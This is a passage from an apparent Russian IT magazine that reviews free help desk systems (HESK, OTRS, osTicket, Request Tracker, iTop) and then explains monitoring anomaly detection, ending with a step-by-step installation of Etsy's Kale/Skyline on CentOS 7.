 desk, позволяющим перейти на бо-
 лее качественный уровень общения
 с клиентами. Такую систему можно
 найти и среди бесплатных решений.
    HESK1 Начнем с самой простой системы, которая может пригодиться для небольших
      компаний. HESK — быстрая бесплатная система, написанная на PHP, для под-
      держки клиентов через веб-интерфейс или email. Страница клиента содержит
       ссылки, позволяющие создать новый запрос или просмотреть текущие и са-
     мому найти ответ. Здесь же размещается база знаний, статьи в нее могут до-
      бавляться автоматически по результатам ответов на некоторые предыдущие
      запросы. Сюда же выводятся сервисные сообщения (например, предупрежде-
      ния об аварии). Полезно, чтобы пользователи не создавали однотипные тике-
      ты по текущей ситуации. Поля запроса полностью настраиваются, и их можно
      подстроить под любую организацию. Заявку можно отметить, отредактировать,
      переназначить, изменить, распечатать. Реализован экспорт заявок по фильтру.
      Поддерживается создание тикета по email, возможно подключение к почтовому
      серверу по POP3, отправка SMTP или через функцию PHP mail. Также админи-
      стратор может создавать тикет вручную после звонка по телефону или, напри-
      мер, с форума. Запрос автоматически назначается сотруднику, который при не-
      обходимости перенаправляет тому, кто точно может решить проблему клиента.





         Тикеты имеют разные приоритеты, их можно организовать по категори-




       Просмотр тикета в HESK
     ям и фильтровать разными способами. Шаблоны ответов на тикеты и ша-
      блоны тикетов с использованием подстановок позволяют быстро заполнять
      сообщение, увеличивая эффективность службы поддержки. Предусмотрена
      борьба со спамом через блокировку отдельных email и IP. Простые отчеты
      позволяют отследить нагрузку и эффективность службы поддержки. Для ло-
      кализации устанавливается дополнительный пакет. Поддерживается толь-
      ко внутренняя база пользователей/сотрудников. Сотрудник может принад-
      лежать к одной из двух категорий: персонал (можно ограничить количество
      свойств и категорий) или администратор. Доступен бесплатно, но за отно-
      сительно небольшую плату можно получить поддержку и убрать надпись
      Powered by. Проект предлагает и SaaS-вариант. Компания выпускает более
      продвинутую версию SysAid, включающую также управление активами, чат,
      портал пользователя, ITIL, дополнительную аналитику, модули расширения
      и многое другое.
        Для установки потребуется веб-сервер с поддержкой PHP 5.3.0+ и MySQL.
     Сам процесс очень несложный, установка и настройка не вызывает проблем
      даже у админов с небольшим опытом.


    OPEN SOURCE TICKET SYSTEM (OTRS)2 OTRS — одно из самых старых и популярных решений для help desk. Разра-
      батывать его начал в 2001 году Мартин Эденхофер (Martin Edenhofer), позже
     была создана компания OTRS, занимающаяся поддержкой коммерческой
      версии продукта. OTRS был частью большого проекта — некоммерческой
      организации Open Source Business Alliance, занимающейся продвижением
      open source проектов для бизнеса. Версия Free распространяется по лицен-
      зии GNU AGPL, вариант Business Solution доступен в качестве коробочного
     решения и по подписке как SaaS-сервис. Реализован в виде веб-приложе-
       ния. Администрирование, создание пользовательских запросов и отве-
      ты на них — через веб-браузер. Состоит из нескольких модулей. Основная
      платформа содержит все функции для работы с заявками клиентов. При не-
      обходимости администратор через веб-интерфейс может установить до-
      полнительные модули, которые повышают удобство работы с системой: база
      знаний / FAQ, календарь, файловый менеджер, веб-почта, контент-менед-
     жер и многие другие. Особо стоит отметить модуль OTRS::ITSM — OTRS
      для управления IT-сервисами, построенную на основе процессов ITIL (OTRS
      сертифицирована экспертной компанией PinkVERIFY на соответствие ITIL).
     В 2011 году появился публичный репозиторий аддонов OPAR OTRS Package
       ARchive. Но, кроме него, есть и другие репозитории пакетов, плюс пакеты
      предлагаются отдельными компаниями.
  Интерфейс очень прост и понятен. Его легко настроить при помощи тем
и виджетов. В некоторых установках помогает мастер. Система очень гибко
конфигурируется под определенную ситуацию. Для запросов можно указать
очередность, поддерживаются вложенные очереди и перемещение сообще-
ний из одной очереди в другую. Заявки клиенты подают через email или личный
кабинет пользователя. Далее запросы попадают к специалистам поддержки,
которые могут передавать их конкретным экспертам. Пользователь при этом
будет получать подробные уведомления о статусе заявки и контролировать
процесс исполнения в личном кабинете. Все изменения в заявках регистри-
руются, есть несколько уровней просмотра и детализации. Реализованы ша-
блоны автоответов и ответов пользователям. Например, при запросе можно
автоматически добавлять список часто задаваемых вопросов или привязать
заявку к FAQ. Реализован поиск. Система предоставляет самые разнообраз-
ные отчеты, в том числе и в формате PDF. Есть функции опросов, чат и мно-
гое другое. Сотрудникам могут быть определены разные права для доступа
к элементам системы, поддерживаются группы и роли. Роли позволяют задать
политики сразу для группы. Основных групп две. Это агент (Agent) — админи-
стратор и оператор системы OTRS и клиент (Customer) — пользователь, соз-
дающий заявки.





Работа с тикетом в OTRS

   Написана на Perl, поддерживает множество СУБД (MySQL, PostgreSQL
и другие), может интегрироваться с LDAP и Active Directory. Интерфейс OTRS
переведен на 34 языка, среди которых есть и русский. Внешний вид можно
изменить при помощи тем. В настоящее время OTRS используется тысячами
      организаций, в числе которых Федеральное ведомство по информационной
      безопасности Германии, Яндекс, REG.RU, RU-CENTER и многие другие.
         Работает на всех ОС, в которых доступен Perl и Apache: Linux, Solaris, AIX,
      FreeBSD, OpenBSD, OS X и Win. Для установки предлагаются пакеты для RHEL/
      CentOS, Fedora, SuSE и исходные коды плюс подробные инструкции (на англий-
      ском и русском) для администратора и пользователя. В Wiki проекта Ubuntu
      есть инструкция по установке в этом дистрибутиве.


     OSTICKET3 OsTicket — набирающая популярность красивая, простая в настройке и очень
      гибкая система поддержки пользователей, имеющая все необходимое для ор-
      ганизации такого сервиса. Распространяется бесплатно. Запросы клиенты
      могут подавать по email или через онлайн-форму. Для отправки заявки через
     форму регистрация не требуется, нужно указать имя, email, выбрать из спи-
      ска категорию и описать проблему. Чтобы проверить статус заявки, поданной
      без регистрации, используются указанный email и ID (можно активировать кап-
         чу, чтобы не спамили). При поступлении запроса он может проходить через си-
      стему фильтров — это позволяет автоматизировать маршрут билета, посылая
      определенные запросы сразу в нужный отдел, что ускоряет решение задачи.
      Клиенту может отправляться автоответ, содержащий ссылки на информацию
      для самостоятельного решения вопроса. Для настройки автоответа исполь-
      зуются шаблоны, в которых может быть более тридцати переменных. По мере
      прохождения заявки выдается оповещение по email. В поставке есть база зна-
      ний и портал, на котором архивируются все ответы на вопросы. Реализован
      механизм блокировки, чтобы несколько сотрудников не могли одновременно
      работать над одним тикетом. Поля запроса полностью настраиваемы, можно
       указать вложенные поля, когда они открываются при выборе определенного
      вопроса. Персонал может оставлять свои комментарии в запросе. Реализо-
      ван быстрый отбор нерешенных тикетов, есть механизм контроля SLA. Систе-
     ма отчетов позволяет проверить нагрузку на службу поддержки и оценить ее
      эффективность.
         Реализован API для интеграции с другими приложениями. Поддерживает-
      ся несколько уровней учетных записей (гость, пользователь, агент и админ),
      агентов можно разделять по группам, темам и департаментам и назначать ли-
      дера в каждой категории. Для отправки и получения email используются внеш-
      ние SMTP, POP3 и IMAP (все поддерживают SSL) и PHP mail.
        Интерфейс переведен на несколько десятков языков, среди них есть и рус-
       ский. Для локализации устанавливается дополнительный Language Packs. Ло-
      кализованная версия доступна на сайте русскоязычной поддержки. Возмож-
ности расширяются при помощи плагинов. Их количество на порядок меньше,
чем для OTRS. На сайте проекта доступно два плагина для аутентификации
(LDAP/AD и HTTP Pass-Through) и два для сохранения вложений в локальной
ФС или Amazon S3.
   Проект предлагает коммерческую поддержку и облачный сервис. Пользо-
ватели версии Free могут найти ответы на форуме. Многие вопросы подроб-
но освещены в документации, блоге, вики проекта и на сайте русскоязычной
поддержки.
   Написан на PHP. Для установки требуется веб-сервер (Apache, IIS), PHP,
СУБД MySQL/MariaDB и любая ОС, где это есть. Сам процесс стандартен
для такого рода приложений, по ходу мастер выдает подсказки, что нужно сде-
лать, последующие настройки несложны и понятны.





Обработка заявки в OsTicket
     RT: REQUEST TRACKER4 Request Tracker — система отслеживания заявок пользователей и управле-
      ния задачами, разработанная в 1996 году Джесси Винсентом (Jesse Vincent)
      для службы поддержки, сотрудником которой он был. Продукт стал пользо-
      ваться популярностью, и впоследствии была создана компания Best Practical
      для поддержки и распространения RT. Практически все функции RT можно
      легко подстроить под конкретную задачу. Тикеты пользователи добавляют
      при помощи веб-интерфейса (как зарегистрированные, так и гостевой) или
        email, плюс сотрудник может заносить их вручную (например, по телефону).
      Поля тикета легко изменить. Система электронной почты поддерживает авто-
       ответы, вложения, PGP, S/MIME, есть продвинутый текстовый редактор. Марш-
      руты почты устанавливаются при помощи правил. Отвечать на тикет можно
      также через email.
        Доступен REST API и утилита командной строки, позволяющие взаимодей-
      ствовать с RT в сторонних приложениях. В настоящее время работает с ArcSight,
       Nagios, Journyx, MediaWiki, Subversion и другими. Также поддерживаются RSS
      и iCalс, позволяющие сотрудникам получать информацию о новых событиях.
     RT предлагает современный веб-интерфейс, внешний вид которого меняет-
      ся при помощи тем, щелчком перестраиваются меню и панели. Изначально
      панели по умолчанию устанавливает для всех админ, но пользователи могут
      создавать свои. Удобно показываются вся связанная с тикетом информация,
      комментарии и вложения. При связывании тикетов используется автодопол-
      нение, это иногда удобнее, чем выпадающие списки. Доступна система отче-
       тов, генерирующая на выходе несколько графиков и диаграмм, позволяющих
      визуально оценить эффективность работы.
        Для создания запроса в Query Builder используется простой язык, позво-
     ляющий находить и группировать данные на основании нескольких критериев.
      Наиболее частые запросы можно добавить в меню и вызывать кнопкой, что-
     бы не настраивать их повторно. Сохраненный график появляется в Dashboard,
     можно открыть право на чтение другим пользователям. Информация экспорти-
      руется в таблицы Open/LibreOffice или MS Excel. Возможности RT расширяют-
      ся при помощи портлетов и аддонов. На сайте проекта доступен репозиторий,
      в котором находится 53 аддона. Выбрать есть из чего: парсер ACNS, допол-
      нительные отчеты, диаграммы Ганта, капча, календарь, импорт в CSV и многое
       другое. Процесс создания своего модуля подробно расписан в документации.
     Для разграничения доступа использована концепция ролей и групп, пользо-
      ватели могут получить доступ только к разрешенным данным.
       В RT интегрирован RTFM (до версии 4 поставлялся отдельно) — инструмент
      управления базой знаний, позволяющий собрать в одном месте решения всех
      вопросов. Реализован поиск по тикетам и статьям. Также хочется отметить
версию RTIR (Request Tracker for Incident Response) — это специальная версия
продукта для реагирования на инциденты компьютерной безопасности, раз-
работанная совместно с Janet CSIRT.





Dashboard Request Tracker

   Веб-интерфейс написан на PSGI и оптимизирован для использования
на мобильных устройствах (iPhone, Android, webOS), переведен на восемнад-
цать языков, в списке есть русский. В настоящее время RT используют такие
организации, как NASA, Lexmark, DynDNS, Berkeley Lab.
   Написан на Perl. Для развертывания подойдет любая ОС, которая поддер-
живает Apache, Lighttpd, nginx, ModPerl, FastCGI и СУБД MySQL/PostgreSQL/
Oracle. С пакетом поставляется внутренний standalone-сервер (запускается /
opt/rt4/sbin/rt-server --port 8080), но он рекомендуется для тестирования или
разработки. При небольших нагрузках он тормозит, поэтому в продакшене
следует использовать реальный веб-сервер.
  В качестве ОС разработчики рекомендуют *nix. Продукт распространяется
по лицензии GNU GPL, доступна платная поддержка и свой SaaS-сервис с не-
      сколькими тарифными планами. Проект хорошо документирован (на английском),
      правда документация в man-стиле и новичку, вероятно, будет сложно. Для уста-
      новки понадобится несколько десятков Perl-модулей, вручную их ставить необя-
       зательно, достаточно использовать make testdeps и make fixdeps. Для проверки
      готовности обе команды используют Perl-скрипт rt-test-dependencies, который
     можно выполнить самостоятельно. Последующие настройки вряд ли удастся
      сделать интуитивно, и они потребуют чтения документации.


     ITOP5 iTop — название получено от IT Operational Portal. Open source проект компа-
      нии Combodo на основе практик ITIL/ITSM, предназначенный для автомати-
      зации работы IT-подразделений. По функциям это гораздо больше, чем про-
      сто help desk, и затрагивает практически все аспекты управления IT, позволяя
      организовать управление запросами пользователей, инцидентами, запроса-
     ми на обслуживание. Благодаря полностью настраиваемой модели данных
      адаптируется к потребностям любой организации.
        Центральный компонент iTop — база данных управления конфигураци-
      ей (CMDB, Configuration Management Database), содержащая информацию
      об IT-инфраструктуре: состав и конфигурация элементов (серверы, приложе-
       ния, VM...), расположение (Location), взаимосвязи и зависимости между ними.
     Все остальные функции являются дополнениями и навесками над CMDB.
    CMDB может быть интегрирована с другими инструментами — системами
      мониторинга, инвентаризации, отчетов и так далее. Поддерживается обмен
     информацией (экспорт и импорт) с разными источниками, в том числе и CSV
      и Excel. Для синхронизации с другими источниками и экспорта/импорта дан-
      ных используется также REST API и CLI. Организован поиск по практически
     любым критериям. Модуль управления проблемами предоставляет аналитику,
       что помогает собирать знания об общих ошибках. Базовые возможности рас-
      ширяются при помощи модулей, пока их семь.
        Возможна организация нескольких уровней технической поддержки, запро-
     сы пользователи могут подавать несколькими способами, в том числе и через
      специальный портал. Хотя в базовой Community-версии отсутствует возмож-
      ность подать запрос через email и не реализован автоответ, но среди расши-
      рений доступен нужный модуль, поддерживающий работу с POP3 и IMAP (для
      запросов клиента и для инцидентов используются разные ящики). Запросы
      могут содержать вложения. База знаний предоставляет ответы на часто зада-
      ваемые вопросы и другую нужную информацию. Организован поиск запросов
      по нескольким критериям, графики позволяют оценить нагрузку и эффектив-
      ность работы службы поддержки.
  При планировании развертывания iTop принимается решение о структуре ор-
ганизации, которое включает описание клиентов и поставщиков, вопросы безо-
пасности. Почти все объекты имеют отношение к организации. Одна установка
может обслуживать несколько организаций с иерархией между ними. Пользова-
тели разбиваются по командам (team) и получают доступ только к разрешенным
организациям. Поддерживается внутренняя база пользователей, LDAP и внеш-
ние (например, Apache, решения вроде Jasig CAS), возможно несколько вариантов
входа в систему. Поддерживаются профили пользователей, сочетание которых
определяют права на использование объектов. В настоящее время имеется две-
надцать предопределенных профилей, самостоятельно создавать новые нель-
зя (через GUI). Реализована настраиваемая система предупреждений, на ос-
нове триггеров (создание, модификация объекта и другие) и действий. Каждое
действие может быть вызвано срабатыванием одного или нескольких триггеров,
срабатывание может выполнить одно или несколько действий. Правда, среди
действий пока реализована только отправка email. Есть контроль SLA и функция
аудита, которая строится на выполнении определенных запросов к базе данных.





iTop — полноценная система для автоматизации работы ИТ-подразделений

Управление настроено через веб-интерфейс, каждый может подогнать его
функции под свою роль и задачи, на Dashboard или меню легко вынести любые
запросы или настройки. Настройки Dashboard страницы сохраняются в XML
и импортируются для другой учетной записи. Интерфейс переведен на рус-
ский. Админу доступен редактор конфигурации, позволяющий непосред-
ственно из интерфейса править исходные файлы iTop.
Графики iTop позволяют наглядно оценить эффективность работы

Проект предлагает платную поддержку и несколько платных версий продукта,
отличающихся от Community наличием определенных модулей. Документация
проекта весьма подробна и позволяет разобраться в основных моментах са-
мостоятельно, в частности как создавать запросы, триггеры и действия. Есть
ресурс поддержки русскоязычных пользователей.
   Написан на PHP. Для работы потребуется веб-сервер Apache/IIS, MySQL
и PHP. Для отправки сообщений используется Sendmail, установленный на том
же сервере, или внешний SMTP. В качестве ОС *nix или Win.

ЗАКЛЮЧЕНИЕ
На самом деле выбор help desk систем очень большой. Перед внедрением сле-
дует четко определиться с критериями, прежде всего это набор возможностей
системы, а также ОС, язык разработки, лицензия. Чем функциональнее реше-
ние, тем оно сложнее и тем большего времени требует на внедрение и осво-
ение сотрудниками. Поэтому гнаться за лишним тоже не стоит. Но учти: если
система не подходит под текущие процессы, необязательно, что она не подхо-
дит совсем, — вполне вероятно, что как раз процессы в организации не самые
оптимальные и, возможно, лучше именно их перестроить под систему.
SYNACK





                                                                            Мартин
                                                                                         «urban.prankster»
                                                                                Пранкевич
                                                                                                 martin@synack.ruМЕРЯЕМ
ПО-НОВОМУ
ОБНАРУЖЕНИЕ АНОМАЛИЙ
ПРИ ПОМОЩИ KALE

 Системы мониторинга ежесекундно собирают тысячи па-
 раметров с сотен систем, визуализируя данные в виде
 графиков и предупреждая админа о превышении уста-
 новленного значения. Но преодоление порога не всег-
 да означает проблему, оно может быть вызвано рядом
 факторов. Причем нагрузочное тестирование отличается
 от действий реальных пользователей весьма серьезно.
 Увидеть зависимости в большом числе таблиц и графиков
 практически нереально, как и установить правильное зна-
 чение порогов для метрик.
ПРОБЛЕМЫ МОНИТОРИНГА СЛОЖНЫХ СЕТЕЙ
Для мониторинга IT-инфраструктуры разработано множество инструмен-
тов, в том числе и под open source лицензиями: Nagios, клоны Shinken и Icinga,
StatsD, Zabbix, Cacti и другие. Очевидные проблемные ситуации, такие как за-
грузка CPU или RAM, свободное место на харде, дисковые операции, просты
в понимании, легко отслеживаются при помощи установленных порогов, кор-
ректируемых для каждого конкретного случая, в том числе и по результатам
нагрузочного тестирования. Получаемые графики наглядны, и такой способ
покрывает большинство потребностей и рекомендуется как единственный.
Но сегодня системы очень сложны, и, главное, их количество растет. На сер-
вере могут работать сотни виртуальных машин, обменивающихся информа-
цией с другими, и поэтому проблема, снижающая производительность, часто
неочевидна, а алерты молчат. Количество метрик уже исчисляется сотнями,
настройка и подстройка их всех требует времени. И главное — чтобы уследить
за ними всеми, требуется уже серьезная команда. Но это еще не все. Реальная
модель поведения пользователя отличается от идеальной, заложенной разра-
ботчиками приложения, которую можно проверить под нагрузкой и прописать
в шаблоны мониторинга. Построенные на правилах оповещения являются по-
роговыми, то есть мы получаем предупреждение, когда уже что-то произошло
и нужно срочно принимать меры. Их статичный характер приводит к тому, что
нередко выдаются ложные срабатывания (false positives) во время пика нагруз-
ки и пропускаются знаковые события (false negatives) в обычной работе.
  В итоге для того, чтобы найти проблему, нужно отследить не только мно-
жество данных, но и зависимости, полученные из нескольких источников в те-
чение продолжительного времени, показывающих значение в пределах до-
пустимого порога (то есть обычно выпадающих из зоны внимания). Вручную
сделать это просто нереально, придется обработать большое количество
данных, не зная, что искать и как должен выглядеть результат. Здесь уже при-
дется задействовать автоматизацию, использующую разные математические
модели, которые помогают обнаружить опасные ситуации до того, как они ста-
ли критическими.

ИЗ ЧЕГО ВЫБИРАЕМ
Средства обнаружения аномалий в поведении приложений развивались дву-
мя способами: одни анализировали события в журнале (есть ли подозритель-
ные записи) или считывали цифры, другие использовали метрики, полученные
от различных инструментов мониторинга. Но общий принцип их работы прост.
Чтобы понять закономерности поведения, предсказывается вероятный диа-
пазон будущих значений; если оно не совпадает с текущим, регистрируется
аномалия. Также используются различные формы прогнозирования, обеспе-
чивающие точность результатов и предсказание состояния системы. Сегодня
уже доступно несколько рабочих решений, легко подхватывающих любую сеть,
адаптирующихся к изменениям среды и не требующих длительного обучения.
  Anomaly Detective — универсальный инструмент, способный обраба-
тывать любые данные и обнаруживающий любые изменения, указывающие
на проблемы с производительностью или безопасностью, не требует пред-
варительной настройки. Информацию получает из лог-файлов, результат вы-
водится в виде внятных графиков и оповещений. Предлагаемый API REST по-
зволяет получать данные из любого источника. Дополнительно предлагается
Anomaly Detective Application for Splunk Enterprise, который расширяет стан-
дартные поисковые запросы этой платформы новыми алгоритмами, выявляю-
щими аномалии. Ставится Anomaly Detective на Win, Linux, OS X и SunOS, раз-
вертывание относительно просто, и с ним справится новичок. Прайс зависит
от объема данных. Доступна триал-версия.
  Sumo Logic реализован в виде SaaS, позволяющего собирать, нака-
пливать и анализировать информацию от журналов различных источников.
Внешне похож на подобные сервисы агрегации журналов, но специальный
механизм LogReduce умеет объединять повторяющиеся позиции, уменьшая
количество данных. Поверх LogReduce реализовано решение, обнаруживаю-
щее аномалии. Для этого вначале сканируются собранные данные и созда-
ется профиль нормальной работы системы, после чего система отслеживает
отклонения и если их обнаруживает, то выдает предупреждения, графики и,
главное, внятные комментарии. Технология Predictive Analytics расширяет си-
стему обнаружения аномалий, строя прогнозы будущих нарушений на основе
текущего поведения системы, и дает возможность увидеть проблемы до того,
как они наступят. Обеспечивается должный уровень конфиденциальности,
данные шифруются. Реализация в виде SaaS снимает необходимость в орга-
низации бэкапа собранных данных, все эти вопросы реализованы на сторо-
не сервиса. Как большой плюс можно отметить возможность просто загру-
зить офлайн-файлы журналов для последующего анализа алгоритмами Sumo
Logic. Есть версия Free, дающая возможность использовать бесплатно сервис
при трафике до 500 Мбайт в день, чего хватает для небольших проектов. Раз-
вертывание в общем несложно, на системы устанавливаются коллекторы (до-
ступны пакеты для Linux, Win, OS X и Solaris), которые подключаются к серверу.
С учетом триал-периода, это позволяет быстро оценить свои сайты и попро-
бовать найти проблему.
Особенность Sumo Logic — офлайн-загрузка логов





Графики в Sumo Logic


Grok — продукт, представляющий собой коммерческую версию и дальней-
шее развитие open source проекта NuPIC компании Numenta. Предназначен
для обнаружения аномалий в AWS, работает со всеми веб-сервисами Amazon:
EC2, EBS, ELB, RDS и другими. Для анализа используются системные метри-
ки Amazon CloudWatch, на основе которых строятся модели нормальной ра-
боты системы, администратору показываются гистограммы для визуализации
уровня аномалий, раскрашенные в зависимости от ситуации: зеленый — все
хорошо, красный — есть проблемы. Кроме этого, с его помощью можно от-
следить тенденции и устранить проблему до ее появления. Можно настроить
уведомления на почту или СМС. В качестве основного интерфейса использу-
ется мобильный клиент для устройства на базе Android. Для контроля двухсот
метрик продукт можно использовать бесплатно. Поддерживается только *nix.
Установка и конфигурация проста, он есть на Amazon Marketplace. Для уста-
новки потребуется учетная запись на AWS.





Grok рассчитан на обнаружение аномалий на сервисах Amazon


Как видишь, все проекты требуют некоторых вложений, а бесплатные ограни-
чены трафиком, но выход есть.

ПРОЕКТ KALE
Компания Etsy, столкнувшаяся с задачей мониторинга большого количества си-
стем, разработала open source решение Kale (некоторое время проект назы-
вался Loupe, но это имя оказалось занято, и название было изменено), позво-
ляющее на основе собранной статистики найти аномалию без необходимости
настройки порогов для метрик. Предназначен для использования в системах
с большим количеством параметров, требующих постоянного наблюдения. Идея
расписана в статье Introducing Kale: вначале создается модель нормального по-
ведения системы, затем статистический анализ определяет отклонения в этой
модели и показывает коррелированные результаты, поясняя причину. Написан
на Python, код открыт, поэтому многие компоненты легко поддаются изменению.
   Kale состоит из двух частей, которые могут использоваться независимо.
Основной компонент, Skyline, собственно, и предназначен для автоматиче-
ского обнаружения аномалий, без необходимости установки метрик и поро-
гов. Он просто получает данные с системы мониторинга (теоретически и лю-
бых других) и анализирует при помощи сразу нескольких алгоритмов, что само
по себе составляет важную особенность этого проекта. Если обнаружится не-
нормальное поведение, администратору будет показан список метрик и свя-
занные графики, при помощи простого интерфейса их можно отбирать и из-
учать. При необходимости в процедуру отслеживания легко добавить новые
метрики или изменить алгоритмы.
   Дополнение Skyline Oculus используется как компонент корреляции метрик
в найденных Skyline аномалиях. Достаточно выбрать в веб-интерфейсе Skyline
нужную метрику, и Oculus покажет все коррелирующие с ней метрики. Для по-
иска исходные данные нормализуются и кодируются, в итоге получается не-
кий отпечаток, показывающий ход графика, закодированный при помощи пяти
ключевых слов: sdec (резко вниз), dec (вниз), s (ровно), inc (вверх), sinc (резко
вверх). Производится поиск по отпечатку, далее при помощи одного из двух
алгоритмов сравнения (FastDTW или Euclidian) отбираются схожие результаты.
Естественно, возможно использовать оба алгоритма и сравнить результаты.
Полученным данным можно дать описание, можно сохранить их, исключить
ненужное при помощи фильтра, сгруппировать в коллекцию. Коллекции по-
зволяют повторно использовать информацию о ранее найденных проблемах,
если они появятся вновь, без необходимости разбираться, что к чему.
  Для поиска аномалий достаточно на первых порах развернуть только Skyline,
многие довольствуются им одним. Но при необходимости впоследствии мож-
но добавить и Oculus.

КОМПОНЕНТЫ SKYLINE
Сам Skyline состоит из нескольких компонентов. За сбор данных отвечает
Horizon, который при помощи Listeners принимает входные данные в двух фор-
матах: pickle (TCP) (адаптирован под сервис carbon-relay из Graphite, по умол-
чанию 2024-й порт) и UDP MessagePack. Так как не все системы мониторинга
поддерживают эти протоколы, используется в качестве основной следующая
схема. Данные с коллекторов (вроде collectd, diamond, statsd) или систем мо-
ниторинга (Nagios, Icinga, Zabbix, Sensu...) передаются в Graphite, затем carbon-
relay перенаправляет их в Skyline. Далее они упаковываются с помощью
MessagePack и заносятся в базу данных Redis — еще один компонент Skyline.
Поддержку MessagePack можно легко реализовать на любом языке для любой
платформы мониторинга, поэтому подключить новый источник не проблема,
как и добавить свой Listener (файл listen.py). Некоторые подробности по на-
стройке смотри в Getting Data Into Skyline. Чтобы не забивать базу ненужной
информацией, можно настроить фильтры и игнорировать ненужные метри-
ки. Также Horizon Agent периодически самостоятельно очищает базу данных
от устаревших метрик.
  За анализ данных отвечает компонент Analyzer (https://github.com/etsy/
skyline/wiki/Analyzer). Во время работы он получает метрики с Redis, далее запу-
скается несколько процессов, которым назначаются определенные метрики.
Проверка — функция ресурсозатратная, ведь нужно распаковать MessagePack
и проанализировать, поэтому есть возможность указать количество процес-
сов (по умолчанию ANALYZER_PROCESSES = 5 в файле settings.py). Анализ
производится при помощи нескольких алгоритмов, выдающих каждый свой
результат. Если большинство алгоритмов покажет, что обнаружена анома-
лия, то метрика будет считаться аномальной, сохранится в файл и выведется
в виде картинки в веб-интерфейсе. Кроме этого, можно задать предупрежде-
ние, в данный момент доступны SMTP, HipChat и PagerDuty. При необходимости
администратор может изменить порог, указав число алгоритмов, положитель-
ный результат которых будет показывать аномалию, а также отключить лиш-
ние проверки, добавить новые алгоритмы или изменить работу имеющихся.
Все алгоритмы описаны в файле algorithms.py, в настоящее время их девять
(first_hour_average, mean_subtraction_cumulation, stddev_from_average, stddev_
from_moving_average, least_squares, grubbs, histogram_bins, median_absolute_
deviation, ks_test), по умолчанию порог срабатывания установлен в шесть
(CONSENSUS = 6). Возможны варианты, когда алгоритмам не хватает данных
или данные давно не обновлялись, поэтому, кроме аномалий, администратор
может получать соответствующие сообщения.
  В качестве интерфейса webapp для вывода графиков используется не-
большое веб-приложение, написанное на Python с микрофреймворком Flask.
По умолчанию работает на 127.0.0.1:1500. Интерфейс очень прост. Вверху ото-
бражаются два графика — за час и день, ниже выводится список всех аномаль-
ных метрик. При наведении курсора на метрику графики показывают нужный
участок. При щелчке открывается окно Oculus.

УСТАНОВКА SKYLINE
Развертывание Skyline совсем простым назвать нельзя. Проект предостав-
ляет доступ к исходным кодам, общую инструкцию, а также краткие советы
по установке в Debian и Vagrant. Также есть проекты, предлагающие модули
Puppet и Cookbooks Chef. Поэтому придется немного повозиться, разбираясь
с мелочами. Для примера установим Skyline на CentOS 7, в других дистрибу-
тивах процесс в основном схож и будут отличаться только названия пакетов.
Для упрощения будем считать, что система развернута, настроены сервисы
мониторинга вроде collectd, Nagios и система отрисовки графиков Graphite.
Для установки понадобятся права админа, я использую sudo:
$ sudo yum install httpd gcc gcc-c++ git pycairo mod_wsgi
    python-pip python-devel blas-devel lapack-devel libffi-devel

Получаем код Skyline c GitHub:

$ cd /opt
$ sudo git clone https://github.com/etsy/skyline.git
$ cd skyline

Ставим рекомендуемые пакеты для Python:

$ sudo pip install -U six

Разработчики подготовили файл requirements.txt, внутри закомментирован мо-
дуль python-simple-hipchat, если HipChat планируется к использованию, нужно
убрать решетку, хотя можно поставить и потом.

$ sudo pip install -r requirements.txt

Затем доустанавливаем еще Python-пакеты (numpy,  scipy, pandas,  patsy,
statsmodels, msgpack-python). Через pip их сборка займет некоторое время,
но часть есть в репозитории:

$ sudo pip install patsy
$ sudo pip install statsmodels
$ sudo yum install python-numpy python-scipy python-pandas
    python-msgpack

В поставке идет готовый конфигурационный файл, копируем с новым именем:

$ sudo cp /opt/skyline/src/settings.py.example /opt/skyline/src/settings.py

Все параметры расписывать нет смысла, внутри несколько секций, одни на-
стройки понят0ны и без объяснений, другие расписаны выше, часть трогать
вообще не нужно. Пока нужно указать IP всех компонентов:

GRAPHITE_HOST = 127.0.0.0
HORIZON_IP = 0.0.0.0
WEBAPP_IP = 192.168.1.2
По умолчанию webapp доступен только с локального узла, можно это изме-
нить:

WEBAPP_IP = 0.0.0.0
WEBAPP_PORT = 1500





Настройка анализатора в settings.py

Создаем рабочие каталоги:

$ sudo mkdir /var/log/skyline
$ sudo mkdir /var/run/skyline
$ sudo mkdir /var/log/redis
$ sudo mkdir /var/dump/

Ставим Redis:

$ sudo yum install redis
Запускаем компоненты Skyline и Redis:

$ cd /opt/skyline/bin
$ sudo redis-server redis.conf
$ sudo /opt/skyline/bin/horizon.d start
$ sudo /opt/skyline/bin/analyzer.d start
$ sudo /opt/skyline/bin/webapp.d start

В поставке есть скрипт, позволяющий проверить правильность работы Skyline:

$ python /opt/skyline/utils/seed_data.py

Если не получаем ошибок, значит, все нормально. Если ошибка, то придет-
ся разбираться, так как явно есть проблема. Иногда мешает firewall, на время
экспериментов его можно отключить, затем разрешить подключение к опре-
деленным портам (сarbon-relay принимает данные на порт 2013, сarbon-cache
слушает 2004, а Horizon — 2024). Базовая установка закончена, теперь нужно
подать информацию в Skyline. Иногда ответ дает прослушка портов с tcpdump.
  В поставке Graphite есть готовый конфигурационный файл для carbon-relay:

$ sudo cp /opt/graphite/conf/relay-rules.conf.example
    /opt/graphite/conf/relay-rules.conf

Необходимо прописать внутри IP сервера Skyline:

$ sudo nano /opt/graphite/conf/relay-rules.conf
[default]
default = true
destinations = 127.0.0.1:2004, 192.168.1.2:2024

Эти  же  данные  указываем  в  carbon.conf,  раскомментировав  строчку
DESTINATIONS.

$ sudo nano /opt/graphite/conf/carbon.conf
[relay]
...
DESTINATIONS = 127.0.0.1:2004, 192.168.1.2:2024
...

Перезапускаем сервис carbon-relay:

$ sudo systemctl restart carbon-relay
Настройка сarbon-relay

Теперь можем подключиться браузером  к порту 1500 сервера  Skyline
http://192.168.1.2:1500 и получим доступ к веб-странице. Первые графики мо-
гут появиться в течение часа, лучше в это время не сильно нагружать систему,
чтобы был создан нормальный профиль. На полную Skyline заработает через
сутки (FULL_DURATION = 86 400 с).
Установка Skyline завершена, ждем обновления данных

ЗАКЛЮЧЕНИЕ
В последнее время растет объем данных, анализ которых стандартными
средствами практически невозможен. Но пока системы обнаружения анома-
лий не стремятся полностью заменить традиционные, использующие пороги
и правила. Те вполне справляются с большинством задач, и их применение
обкатано годами, к тому же они имеют низкий процент ложных срабатываний,
чем пока не может похвастаться Kale и другие подобные решения. Но в опре-
деленных обстоятельствах это незаменимое дополнение к уже существующим
средствам мониторинга. Тем более их внедрение не требует больших усилий,
а эффект применения очень высок.
SYNACK
                    МАСШТАБИРУЕМ
                     ТВОЙ СЕРВИС
                    С ПОМОЩЬЮ
